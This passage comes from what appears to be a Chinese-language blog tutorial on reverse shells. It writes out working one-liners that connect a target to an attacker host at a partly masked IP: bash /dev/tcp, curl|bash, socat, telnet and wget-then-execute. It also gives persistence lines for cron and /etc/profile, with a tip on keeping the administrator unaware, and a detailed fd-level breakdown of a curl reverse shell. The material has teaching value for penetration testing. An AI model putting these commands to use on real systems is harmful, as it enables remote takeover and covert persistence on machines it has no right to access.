class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/攻击机IP/</span>攻击机端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/28/%E5%8F%8D%E5%BC%B9shell/07353625fc33d5ea76e36364397fd71.png" alt="07353625fc33d5ea76e36364397fd71"></p><blockquote><p>以下是针对Bash反弹一句话进行了拆分说明：</p><table><thead><tr><th>命令</th><th>命令详解</th></tr></thead><tbody><tr><td>bash -i</td><td>产生一个bash交互环境。</td></tr><tr><td>&gt;&amp;</td><td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td></tr><tr><td>&#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333</td><td>Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td></tr><tr><td>0&gt;&amp;1</td><td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td></tr></tbody></table><p>Bash反弹一句完整的解读过程就是：</p><p>Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p></blockquote><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Linux shell下有三种标准的文件描述符，分别如下：<br><span class="hljs-number">0</span> - stdin 代表标准输入,使用&lt;或&lt;&lt;<br><span class="hljs-number">1</span> - stdout 代表标准输出,使用&gt;或&gt;&gt;<br><span class="hljs-number">2</span> - stderr 代表标准错误输出,使用<span class="hljs-number">2</span>&gt;或<span class="hljs-number">2</span>&gt;&gt;<br><br>还有就是&gt;<span class="hljs-meta">&amp;这个符号的含义，最好的理解是这样的：</span><br>当&gt;<span class="hljs-meta">&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。</span><br>当&gt;<span class="hljs-meta">&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</span><br><br>理解了上面这些知识，下面来解释一下这一条反弹shell的命令<br>bash -i代表在本地打开一个交互式bash，<br>/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，<br>&gt;<span class="hljs-meta">&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，</span><br>如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出，这个时候我们在目标机输入命令，<br>输出以及错误输出的内容就会被传递显示到远程。<br></code></pre></td></tr></table></figure><h3 id="Curl配合Bash反弹shell"><a href="#Curl配合Bash反弹shell" class="headerlink" title="Curl配合Bash反弹shell"></a>Curl配合Bash反弹shell</h3><p>这里操作也很简单，借助了Linux中的管道。</p><p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>并开启2333端口的监听。</p><p>然后再目标机上执行如下，即可反弹shell：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> <span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>|bash<br></code></pre></td></tr></table></figure><p>根据curl命令和Linux管道的作用，你不难理解这其中的原理。</p><p>Curl配合Bash反弹shell的方式在CTF题目中经常出现，<code>curl IP|bash</code> 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p><h3 id="将反弹shell的命令写入定时任务"><a href="#将反弹shell的命令写入定时任务" class="headerlink" title="将反弹shell的命令写入定时任务"></a>将反弹shell的命令写入定时任务</h3><p>我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</p><p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 中。(centos系列主机)</p><p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root 中。(Debian&#x2F;Ubuntu系列主机)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">*<span class="hljs-regexp">/1  *  *  *  *   /</span>bin<span class="hljs-regexp">/bash -i&gt;&amp;/</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><br><span class="hljs-comment">#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span><br></code></pre></td></tr></table></figure><h3 id="将反弹shell的命令写入-etc-profile文件"><a href="#将反弹shell的命令写入-etc-profile文件" class="headerlink" title="将反弹shell的命令写入&#x2F;etc&#x2F;profile文件"></a>将反弹shell的命令写入&#x2F;etc&#x2F;profile文件</h3><p>将以下反弹shell的命写入&#x2F;etc&#x2F;profile文件中，&#x2F;etc&#x2F;profile中的内容会在用户打开bash窗口时执行。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/47.xxx.xxx.72/</span><span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> &amp;<br><span class="hljs-comment"># 最后面那个&amp;为的是防止管理员无法输入命令</span><br></code></pre></td></tr></table></figure><p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的shell：</p><h2 id="利用Socat反弹shell"><a href="#利用Socat反弹shell" class="headerlink" title="利用Socat反弹shell"></a>利用Socat反弹shell</h2><p>Socat是Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，不过据说可以看做netcat的加强版，事实上的确也是如此。我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参见这里：<a href="http://brieflyx.me/2015/linux-tools/socat-introduction/">http://brieflyx.me/2015/linux-tools/socat-introduction/</a></p><p>安装Socat的方法很简单：</p><ul><li>Ubuntu等可以直接使用 <code>apt-get install socat</code> 命令进行安装</li><li>也可以去官网下载源码包：<a href="http://www.dest-unreach.org/socat">http://www.dest-unreach.org/socat</a></li></ul><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">socat</span> TCP-LISTEN:<span class="hljs-number">2333</span> -<br>或<br>nc -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socat</span> tcp-connect:<span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>:<span class="hljs-number">2333</span> exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane<br></code></pre></td></tr></table></figure><h2 id="利用Telnet反弹shell"><a href="#利用Telnet反弹shell" class="headerlink" title="利用Telnet反弹shell"></a>利用Telnet反弹shell</h2><p>当nc和&#x2F;dev&#x2F;tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以使用Telnet反弹shell。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mknod</span> a p; telnet <span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span> <span class="hljs-number">2333</span> <span class="hljs-number">0</span>&lt;a | /bin/bash <span class="hljs-number">1</span>&gt;a<br></code></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p><strong>攻击机需要开启两个本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">4000</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">telnet</span> <span class="hljs-number">47.101.57.72</span> <span class="hljs-number">2333</span> | /bin/bash | telnet <span class="hljs-number">47.101.57.72</span> <span class="hljs-number">4000</span><br></code></pre></td></tr></table></figure><h2 id="wget方式反弹shell"><a href="#wget方式反弹shell" class="headerlink" title="wget方式反弹shell"></a>wget方式反弹shell</h2><p>利用wget进行下载执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget 192.168.20.130/shell.txt -O /tmp/x.php &amp;&amp; php /tmp/x.php<br></code></pre></td></tr></table></figure><p>利用下面贴出的php进行反弹。<br>开启监听</p><p><img src="/2023/10/28/%E5%8F%8D%E5%BC%B9shell/1698508151069.png" alt="1698508151069"></p><h2 id="curl-反弹-shell-原理"><a href="#curl-反弹-shell-原理" class="headerlink" title="curl 反弹 shell 原理"></a>curl 反弹 shell 原理</h2><p>在某<a href="https://twitter.com/joevennix/status/1258613994681544704">社交网站</a>上看到一句 curl 反弹 shell 命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123; curl -sNkT . https:<span class="hljs-regexp">//</span><span class="hljs-variable">$LHOST</span>:<span class="hljs-variable">$LPORT</span> &lt;<span class="hljs-regexp">/dev/</span>fd/<span class="hljs-number">3</span>| sh <span class="hljs-number">3</span>&gt;&amp;-;&#125; <span class="hljs-number">3</span>&gt;&amp;<span class="hljs-number">1</span>|:<br></code></pre></td></tr></table></figure><p>这句命令就像魔法一样神奇，和常见的反弹 shell 命令大相径庭。我花了些时间才理解它是如何工作的。</p><h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><h4 id="冒号"><a href="#冒号" class="headerlink" title="冒号"></a>冒号</h4><p>命令的最后一个字符冒号是个鲜为人知的 Bash 内置命令，用 <code>man bash</code> 查看手册可以找到如下的说明：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">: <span class="hljs-comment">[参数]</span><br>    无效；除了扩展参数和执行任何指定的重定向外，该命令没有任何作用。返回的退出码为 0。<br></code></pre></td></tr></table></figure><h4 id="花括号"><a href="#花括号" class="headerlink" title="花括号"></a>花括号</h4><p>在 Bash 中，花括号有多种不同的用法，详情见《[浅析 Bash 中的 {花括号}]》。在我们尝试理解的魔法命令中用到了其中一种：可以在花括号中写多条命令，这些命令构成一个命令组，花括号后的重定向将对命令组中所有命令生效。</p><p>例如执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123; <span class="hljs-built_in">echo</span> 1 ; <span class="hljs-built_in">echo</span> 2 ; &#125; &gt; out.txt<br></code></pre></td></tr></table></figure><p>会发现屏幕没有任何输出，<code>out.txt</code> 的内容是：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1<br>2<br></code></pre></td></tr></table></figure><p>可见两条 <code>echo</code> 命令的标准输出都被重定向到了文件 <code>out.txt</code>。</p><p>需要注意的是，命令组中最后一条命令的后面也需要添加分号，以明确标识命令结束，否则 Bash 的语法解析器将无法正确解析。</p><p>另外，命令组的重定向优先级低于组内命令自身的重定向。例如执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123; <span class="hljs-built_in">echo</span> 1 &gt; inner.txt ; <span class="hljs-built_in">echo</span> 2 ; &#125; &gt; outer.txt<br></code></pre></td></tr></table></figure><p>会发现第一个 <code>echo</code> 命令的输出被重定向到了 <code>inner.txt</code>，而不是 <code>outer.txt</code>。</p><h4 id="dev-fd"><a href="#dev-fd" class="headerlink" title="&#x2F;dev&#x2F;fd&#x2F;"></a>&#x2F;dev&#x2F;fd&#x2F;</h4><p><code>/dev/fd/</code> 是指向 <code>/proc/self/fd</code> 的软链接。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -l /dev/fd<br>lrwxrwxrwx 1 root root 13 Jan 30 12:23 /dev/fd -&gt; /proc/self/fd<br></code></pre></td></tr></table></figure><p><code>/proc/self</code> 是一个特殊的软链接。当有进程查询该软链接的值时，Linux 内核会将 <code>/proc/self</code> 指向 <code>/proc/&lt;该进程的 PID&gt;</code>。</p><h4 id="curl-参数"><a href="#curl-参数" class="headerlink" title="curl 参数"></a>curl 参数</h4><p>使用 <code>man curl</code> 可以查询到魔法命令中 curl 各个参数的含义，整理后列举如下：</p><ul><li>-s, –silent：不显示进度或错误信息。但仍会传输指定数据或输出内容到 <code>stdout</code>。</li><li>-N, –no-buffer：禁用输出流的缓冲功能。正常情况下，curl 会使用一个标准的缓冲输出流，它的作用是将数据分块输出，而不是数据到达后立即输出。可使用该选项禁用这种缓冲。</li><li>-k, –insecure：忽略证书错误。</li><li>-T, –upload-file ：上传指定本地文件到远程 URL。可用 <code>-</code> 做文件名以从 <code>stdin</code> 读取文件内容；也可用 <code>.</code> 做文件名，以非阻塞模式从 <code>stdin</code> 读取文件内容。非阻塞模式是指可从 <code>stdin</code> 读取文件内容的同时读取服务端输出。</li></ul><h3 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h3><p>为理解魔法命令，我们先对其进行语法分析。</p><p>魔法命令被倒数第二个字符 <code>|</code> （管道）分为前后两部分，如下图所示。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                                                       +-------+<br>                                                                       |<span class="hljs-string">       </span>|<br>                                                                       |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                                                       |<span class="hljs-string">       </span>|<br>                                                                       +-+---+-+<br>                                                                         |<span class="hljs-string">   </span>|<br>+-----------------------------------------------------------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">                                                                 </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> &#123; curl -sNkT . https://$LHOST:$LPORT &lt;/dev/fd/3</span>|<span class="hljs-string"> sh 3&gt;&amp;-;&#125; 3&gt;&amp;1 +------+   +-------+   :   </span>|<br>|<span class="hljs-string">                                                                 </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>+-----------------------------------------------------------------+                  +-------+<br></code></pre></td></tr></table></figure><p>前半部分是写在花括号中的命令组，命令组中包含由管道连接的两条命令，如下图所示。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                +-------+<br>                                |<span class="hljs-string">       </span>|<br>                                |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                |<span class="hljs-string">       </span>|<br>                                +-+---+-+<br>                                  |<span class="hljs-string">   </span>|<br>              +------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string">              </span>|<span class="hljs-string">            </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>              |<span class="hljs-string"> &#123;...&#125; 3&gt;&amp;1 +------+   +-------+   :   </span>|<br>              |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>              +------+-----+                  +-------+<br>                     |<span class="hljs-string"></span><br><span class="hljs-string">              +------+-----+</span><br><span class="hljs-string">              </span>|<span class="hljs-string">            </span>|<br>              |<span class="hljs-string">      </span>|<span class="hljs-string">     </span>|<br>              |<span class="hljs-string">            </span>|<br>              +---+---+----+<br>                  |<span class="hljs-string">   </span>|<br>                  |<span class="hljs-string">   +-------------------------------------+</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">                                         </span>|<br>+-----------------+------------------------------+    +-----+----+<br>|<span class="hljs-string">                                                </span>|<span class="hljs-string">    </span>|<span class="hljs-string">          </span>|<br>|<span class="hljs-string">  curl -sNkT . https://$LHOST:$LPORT &lt;/dev/fd/3 </span>|<span class="hljs-string">    </span>|<span class="hljs-string"> sh 3&gt;&amp;-; </span>|<br>|<span class="hljs-string">                                                </span>|<span class="hljs-string">    </span>|<span class="hljs-string">          </span>|<br>+------------------------------------------------+    +----------+<br></code></pre></td></tr></table></figure><h3 id="fd-重定向分析"><a href="#fd-重定向分析" class="headerlink" title="fd 重定向分析"></a>fd 重定向分析</h3><p>完成语法分析后可对 fd 重定向情况进行分析。</p><p>假设执行这条命令的 Bash 的 <code>stdin</code> 和 <code>stdout</code> 都是 <code>pts/0</code>。外层 <code>|</code>（倒数第二个字符）产生的匿名管道为 <code>pipe1</code>，内层 <code>|</code>（curl 和 sh 之间的管道）产生的匿名管道为 <code>pipe2</code>。</p><p>可标注出外层 <code>|</code> 前后命令的 fd 如下图所示。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                                                       +-------+<br>                                                                       |<span class="hljs-string">       </span>|<br>                                                                       |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                                                       |<span class="hljs-string">       </span>|<br>                                                                       +-+---+-+<br>                                                                         |<span class="hljs-string">   </span>|<br>+-----------------------------------------------------------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">                                                                 </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> &#123; curl -sNkT . https://$LHOST:$LPORT &lt;/dev/fd/3</span>|<span class="hljs-string"> sh 3&gt;&amp;-;&#125; 3&gt;&amp;1 +------+   +-------+   :   </span>|<br>|<span class="hljs-string">                                                                 </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>+-----------------------------------------------------------------+                  +-------+<br><br>                         stdin : pts/0                                              stdin : pipe1<br>                         stdout: pipe1                                              stdout: pts/0<br></code></pre></td></tr></table></figure><p>命令组后的 <code>3&gt;&amp;1</code> 将 fd 3 重定向到了 fd 1，即 <code>stdout</code>，如下图所示。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                                                  +-------+<br>                                                                  |<span class="hljs-string">       </span>|<br>                                                                  |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                                                  |<span class="hljs-string">       </span>|<br>                                                                  +-+---+-+<br>                                                                    |<span class="hljs-string">   </span>|<br>+------------------------------------------------------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">                                                            </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>|<span class="hljs-string"> &#123; curl -sNkT . https://$LHOST:$LPORT &lt;/dev/fd/3</span>|<span class="hljs-string"> sh 3&gt;&amp;-;&#125; +------+   +-------+   :   </span>|<br>|<span class="hljs-string">                                                            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>+------------------------------------------------------------+                  +-------+<br><br>                         stdin : pts/0                                         stdin : pipe1<br>                         stdout: pipe1                                         stdout: pts/0<br>                         fd 3  : pipe1<br></code></pre></td></tr></table></figure><p>命令组中的命令会继承 <code>&#123;&#125;</code> 的 fd，同时命令组中两条命令也由一个管道连接，综合这两点可标注出 curl 和 sh 的 fd 如下图所示。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                 +-------+<br>                                 |<span class="hljs-string">       </span>|<br>                                 |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                 |<span class="hljs-string">       </span>|<br>                                 +-+---+-+<br>                                   |<span class="hljs-string">   </span>|<br>               +------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string">stdin : pts/0  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>stdout: pipe1  |<span class="hljs-string"> &#123;...&#125; 3&gt;&amp;1 +------+   +-------+   :   </span>|<br>fd 3  : pipe1  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>               +------+-----+                  +-------+<br>                      |<span class="hljs-string"></span><br><span class="hljs-string">               +------+-----+                 stdin : pipe1</span><br><span class="hljs-string">               </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                 stdout: pts/0</span><br><span class="hljs-string">               </span>|<span class="hljs-string">      </span>|<span class="hljs-string">     </span>|<br>               |<span class="hljs-string">            </span>|<br>               +---+---+----+<br>                   |<span class="hljs-string">   </span>|<br>                   |<span class="hljs-string">   +-------------------------------------+</span><br><span class="hljs-string">                   </span>|<span class="hljs-string">                                         </span>|<br> +-----------------+------------------------------+    +-----+----+<br> |<span class="hljs-string">                                                </span>|<span class="hljs-string">    </span>|<span class="hljs-string">          </span>|<br> |<span class="hljs-string">  curl -sNkT . https://$LHOST:$LPORT &lt;/dev/fd/3 </span>|<span class="hljs-string">    </span>|<span class="hljs-string"> sh 3&gt;&amp;-; </span>|<br> |<span class="hljs-string">                                                </span>|<span class="hljs-string">    </span>|<span class="hljs-string">          </span>|<br> +------------------------------------------------+    +----------+<br><br>                 stdin : pts/0                         stdin : pipe2<br>                 stdout: pipe2                         stdout: pipe1<br>                 fd 3  : pipe1                         fd 3  : pipe1<br></code></pre></td></tr></table></figure><p>curl 和 sh 各自又有一个重定向。curl 的 <code>&lt;/dev/fd/3</code> 表示把 <code>stdin</code> 重定向为 fd 3，即 <code>pipe1</code>。sh 的 <code>3&gt;&amp;-</code> 表示关闭 fd 3。考虑到这两个重定向，最后可得到下图。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                                 +-------+<br>                                 |<span class="hljs-string">       </span>|<br>                                 |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<br>                                 |<span class="hljs-string">       </span>|<br>                                 +-+---+-+<br>                                   |<span class="hljs-string">   </span>|<br>               +------------+      |<span class="hljs-string">   </span>|<span class="hljs-string">       +-------+</span><br><span class="hljs-string">stdin : pts/0  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">      </span>|<span class="hljs-string">   </span>|<span class="hljs-string">       </span>|<span class="hljs-string">       </span>|<br>stdout: pipe1  |<span class="hljs-string"> &#123;...&#125; 3&gt;&amp;1 +------+   +-------+   :   </span>|<br>fd 3  : pipe1  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">       </span>|<br>               +------+-----+                  +-------+<br>                      |<span class="hljs-string"></span><br><span class="hljs-string">               +------+-----+                 stdin : pipe1</span><br><span class="hljs-string">               </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                 stdout: pts/0</span><br><span class="hljs-string">               </span>|<span class="hljs-string">      </span>|<span class="hljs-string">     </span>|<br>               |<span class="hljs-string">            </span>|<br>               +---+---+----+<br>                   |<span class="hljs-string">   </span>|<br>                   |<span class="hljs-string">   +-------------------------------------+</span><br><span class="hljs-string">                   </span>|<span class="hljs-string">                                         </span>|<br> +-----------------+--------------------+              +-----+----+<br> |<span class="hljs-string">                                      </span>|<span class="hljs-string">              </span>|<span class="hljs-string">          </span>|<br> |<span class="hljs-string">  curl -sNkT . https://$LHOST:$LPORT  </span>|<span class="hljs-string">              </span>|<span class="hljs-string">    sh    </span>|<br> |<span class="hljs-string">                                      </span>|<span class="hljs-string">              </span>|<span class="hljs-string">          </span>|<br> +--------------------------------------+              +----------+<br><br>                stdin : pipe1                          stdin : pipe2<br>                stdout: pipe2                          stdout: pipe1<br>                fd 3  : pipe1<br></code></pre></td></tr></table></figure><p>从上图可以很清晰地看出，curl 的 <code>stdin</code> 和 sh 的 <code>stdout</code>、 sh 的 <code>stdin</code> 和 curl 的 <code>stdout</code> 分别通过匿名管道 <code>pipe1</code> 和 